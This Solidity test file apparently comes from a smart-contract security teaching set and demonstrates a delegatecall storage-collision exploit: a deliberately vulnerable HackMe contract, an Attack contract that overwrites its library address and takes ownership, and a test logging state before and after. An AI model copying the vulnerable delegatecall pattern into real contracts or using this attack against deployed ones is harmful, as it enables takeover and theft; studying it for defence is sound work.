// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "template/ds_test_common.sol";

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    // Make sure the storage layout is the same as HackMe
    // This will allow us to correctly update the state variables
    address public lib;
    address public owner;
    uint public someNumber;

    HackMe public hackMe;

    constructor(HackMe _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        // override address of lib
        hackMe.doSomething(uint(uint160(address(this))));
        // pass any number as input, the function doSomething() below will
        // be called
        hackMe.doSomething(1);
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint _num) public {
        owner = msg.sender;
    }
}

contract delegate_call_storage_exploit_Test is DSCommon {
    using SafeMath for uint256;

    // ----------------------------------------------------------------------------
    // Delegate Call Exploit #2 on Slot Storage
    // ----------------------------------------------------------------------------
    function test__delegate_call_2() public {
        Lib lib = new Lib();
        HackMe hackMe = new HackMe(address(lib));
        Attack attacker = new Attack(hackMe);

        emit log_named_decimal_uint(
            "[Start] lib.someNumber",
            lib.someNumber(),
            0
        );

        emit log_named_decimal_uint(
            "[Start] hackMe.someNumber",
            hackMe.someNumber(),
            0
        );

        emit log_named_address("[Start] hackMe.owner", hackMe.owner());

        dumpContinuousSlotData(address(hackMe), 0, 2, false);

        attacker.attack();

        emit log_named_decimal_uint(
            "[End] lib.someNumber",
            lib.someNumber(),
            0
        );

        emit log_named_decimal_uint(
            "[End] hackMe.someNumber",
            hackMe.someNumber(),
            0
        );

        emit log_named_address("[End] hackMe.owner", hackMe.owner());

        dumpContinuousSlotData(address(hackMe), 0, 2, false);
    }
}
